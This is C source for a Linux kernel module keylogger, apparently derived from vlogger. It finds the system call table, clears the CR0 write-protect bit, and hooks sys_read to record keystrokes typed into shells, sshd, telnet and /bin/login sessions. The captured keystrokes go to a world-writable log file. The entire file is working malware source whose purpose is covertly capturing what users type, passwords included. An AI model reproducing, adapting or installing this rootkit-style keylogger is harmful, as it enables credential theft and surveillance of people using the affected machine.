/*
 * 	It was based on vlogger 1.0 <rd@vnsecurity.net> & http://www.thc.org/
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version
 *
 *  This program is distributed in the hope that it will be useful, but
 *  WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  General Public License for more details.
 *
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/tty.h>
#include <linux/string.h>
#include <linux/file.h>
#include <asm/uaccess.h>
#include <linux/syscalls.h>

#define IA32_LSTAR  0xc0000082
#define LOGFILE "/keylogger.log"
#define MODULE_NAME "keylogger"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Kernel Module Keylogger");
MODULE_AUTHOR("");

static char logger_buffer[512];
static char test_buffer[256];
static char special_buffer[2];
int counter = 0;

void **sys_call_table;
asmlinkage int (*original_read) (unsigned int, char *, size_t);

void *get_system_call(void)
{
	void *system_call;
	unsigned char *ptr;
	int i, low, high;

	asm volatile("rdmsr" : "=a" (low), "=d" (high) : "c" (IA32_LSTAR));

	system_call = (void*)(((long)high<<32) | low);

	printk(KERN_INFO "system_call: 0x%p\n", system_call);

	for (ptr=system_call, i=0; i<500; i++) {
		if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5)
			return (void*)(0xffffffff00000000 | *((unsigned int*)(ptr+3)));
	ptr++;
	}

	return NULL;
}

int write_to_logfile(char *buffer)
{
	struct file *file = NULL;
	mm_segment_t fs;
	int error;

	file = filp_open(LOGFILE, O_CREAT|O_APPEND, 00666);

	if (IS_ERR(file)) {
		error = PTR_ERR(file);
		goto out;
	}
	error = -EACCES;
	if (!S_ISREG(file->f_dentry->d_inode->i_mode))
		goto out_err;
	error = -EIO;
	if (!file->f_op->write)
		goto out_err;
	error = 0;

	fs = get_fs();
	set_fs(KERNEL_DS);

	file->f_op->write(file, buffer, strlen(buffer), &file->f_pos);

	set_fs(fs);
	filp_close(file,NULL);

out:
	return error;

out_err:
	filp_close(file, NULL);
	printk(KERN_INFO "keylogger: file error.\n");
	goto out;
}

asmlinkage int hacked_read(unsigned int fd, char *buf, size_t count)
{
	int r, i;
	r = original_read(fd, buf, count);

	if (counter)
	{
		if (counter == 2)
		{         // Arrows + Break
			if (buf[0] == 0x44)
			{
				strcat(logger_buffer, "[Left.Arrow]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x43)
			{
				strcat(logger_buffer, "[Right.Arrow]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x41)
			{
				strcat(logger_buffer, "[Up.Arrow]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x42)
			{
				strcat(logger_buffer, "[Down.Arrow]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x50)
			{
				strcat(logger_buffer, "[Break]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x47)
			{
				strcat(logger_buffer, "[Middle.NumLock]");
				counter = 0;
				goto END;
			}

			strncpy(special_buffer, buf, 1);
			counter++;
			goto END;
		}

		if (counter == 3)
		{   // F1-F5
			if (buf[0] == 0x41)
			{
				strcat(logger_buffer, "[F1]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x42)
			{
				strcat(logger_buffer, "[F2]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x43)
			{
				strcat(logger_buffer, "[F3]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x44)
			{
				strcat(logger_buffer, "[F4]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x45)
			{
				strcat(logger_buffer, "[F5]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x7E)
			{     // PgUp, PgDown, Ins, ...

				if (special_buffer[0] == 0x35)
					strcat (logger_buffer, "[PgUp]");

				if (special_buffer[0] == 0x36)
					strcat (logger_buffer, "[PgDown]");

				if (special_buffer[0] == 0x33)
					strcat (logger_buffer, "[Delete]");

				if (special_buffer[0] == 0x34)
					strcat (logger_buffer, "[End]");

				if (special_buffer[0] == 0x31)
					strcat (logger_buffer, "[Home]");

				if (special_buffer[0] == 0x32)
					 strcat (logger_buffer, "[Ins]");

				counter = 0;
				goto END;
      			}

			if (special_buffer[0] == 0x31)
			{  // F6-F8
				if (buf[0] == 0x37)
					strcat(logger_buffer, "[F6]");

				if (buf[0] == 0x38)
					strcat(logger_buffer, "[F7]");

				if (buf[0] == 0x39)
					strcat(logger_buffer, "[F8]");

				counter++;
				goto END;
			}


			if (special_buffer[0] == 0x32)
			{ // F6-F12
				if (buf[0] == 0x30)
					strcat(logger_buffer, "[F9]");

				if (buf[0] == 0x31)
					strcat(logger_buffer, "[F10]");

				if (buf[0] == 0x33)
					strcat(logger_buffer, "[F11]");

				if (buf[0] == 0x34)
					strcat(logger_buffer, "[F12]");

				counter++;
				goto END;
			}
		}

		if (counter >= 4) {  //WatchDog
			counter = 0;
			goto END;
		}

		counter ++;
		goto END;
	}

/*
** sys_read() has read one byte from stdin or from elsewhere:
** fd == 0   --> stdin (sh, sshd)
** fd == 3   --> telnetd
** fd == 4   --> /bin/login
*/
	if (r == 1 && (fd == 0 || fd == 3 || fd == 4))
	{
		if (buf[0] == 0x15)
		{        // Ctrl+U -> erase the whole row.
			logger_buffer[0] = '\0';
			goto END;
		}

		if (buf[0] == 0x09)
		{        // Tabulation
			strcat(logger_buffer, "[Tab]");
			goto END;
		}
/*
** User sends BackSpace, we erase the last symbol from the logger_buffer[].
** BackSpace is 0x7F if we're logged locally, or 0x08 if we're logged
** with ssh, telnet ...
*/
		if (buf[0] == 0x7F || buf[0] == 0x08)
		{
			if (logger_buffer[strlen(logger_buffer) - 1] == ']') {  // Oh, the last symbol was "special"?

			for (i = 2; strlen(logger_buffer); i++)
// Trying to find the other "["
				if (logger_buffer[strlen(logger_buffer) - i] == '[')
				{
					logger_buffer[strlen(logger_buffer) - i] = '\0';
					break;
				}
				goto END;
			}
			else
			{
// If it was not "special" replace it with '\0'
	 			logger_buffer[strlen(logger_buffer) - 1] = '\0';
				goto END;
			}
		}

		if (buf[0] == 0x1B)
		{ // user just typed a "special" symbol
			counter++;
			goto END;
		}

		if (buf[0] == '\r' || buf[0] == '\n')
		{
			strncat(logger_buffer, "\n", 1);
			sprintf(test_buffer, "%s", logger_buffer);
			write_to_logfile(test_buffer);
			logger_buffer[0] = '\0';
		}
		else
			strncat(logger_buffer, buf, 1);
 	 }

	END:  return r;
}


int init_module(void)
{
	sys_call_table = get_system_call();
	printk("address system call table = %p\n",sys_call_table);      //Output address system call table
	printk("sys_read address = %p\n",(void *)sys_call_table[__NR_read]);

	original_read = (void *)sys_call_table[__NR_read];                //Save address original function
//================= Disable of protect memory ================================//
	asm("pushq %rax");
	asm("movq %cr0, %rax");
	asm("andq $0xfffffffffffeffff, %rax");
	asm("movq %rax, %cr0");
	asm("popq %rax");
//============================================================================//
	sys_call_table[__NR_read] = (unsigned long)hacked_read;
//================= Disable of protect memory ================================//
	asm("pushq %rax");
	asm("movq %cr0, %rax");
	asm("xorq $0x0000000000001000, %rax");
	asm("movq %rax, %cr0");
	asm("popq %rax");
//============================================================================//
	printk(KERN_INFO "keylogger: Module loaded.\n");
	return 0;
}


void cleanup_module(void)
{
	//================= Disable of protect memory ================================//
    asm("pushq %rax");
    asm("movq %cr0, %rax");
    asm("andq $0xfffffffffffeffff, %rax");
    asm("movq %rax, %cr0");
    asm("popq %rax");
//============================================================================//
    sys_call_table[__NR_read] = (unsigned long)original_read;                   //Replace back on original function
//================= Disable of protect memory ================================//
    asm("pushq %rax");
    asm("movq %cr0, %rax");
    asm("xorq $0x0000000000001000, %rax");
    asm("movq %rax, %cr0");
    asm("popq %rax");
//============================================================================//
	printk(KERN_INFO "keylogger: Module unloaded.\n");
}
